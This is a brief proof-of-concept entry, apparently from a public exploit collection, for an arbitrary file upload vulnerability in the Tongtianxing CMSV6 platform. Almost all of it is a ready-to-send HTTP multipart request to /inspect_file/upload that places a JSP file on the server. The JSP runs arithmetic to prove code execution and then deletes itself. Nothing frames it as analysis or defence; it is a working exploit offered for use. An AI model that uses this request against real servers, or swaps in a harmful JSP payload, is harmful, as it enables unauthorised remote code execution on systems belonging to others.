# tontianxing_inspect_file_fileupload
2024.4.1 @2
from: https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9F-CMSV6-inspect_file-upload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
```
POST /inspect_file/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: */*
content-Length: 238
Content-Type: multipart/form-data;boundary=-----------------------------7db372eb000e2

-----------------------------7db372eb000e2
Content-Disposition: form-data; name="uploadFile"; filename="1.jsp"
Content-Type: application/octet-stream

<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
-----------------------------7db372eb000e2--
```
